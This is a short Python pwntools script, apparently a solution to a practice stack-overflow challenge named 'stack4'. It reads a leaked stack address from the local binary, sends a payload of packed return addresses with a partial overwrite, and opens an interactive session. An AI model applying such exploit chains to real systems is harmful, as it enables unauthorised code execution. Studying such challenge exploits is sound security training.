from pwn import *

io = process('./stack4')
# io = gdb.debug(['./stack4'], "b *0x400681")


io.recvuntil(b'ft: ')

stack_addr = int(io.recvline().strip(), 16)

print(hex(stack_addr))

io.sendline(
    p64(stack_addr) + 
    p64(0x4007A3) + 
    p64(0x4007C4) + 
    p64(0x400666) + 
    p64(stack_addr)[:2]
)
io.interactive()
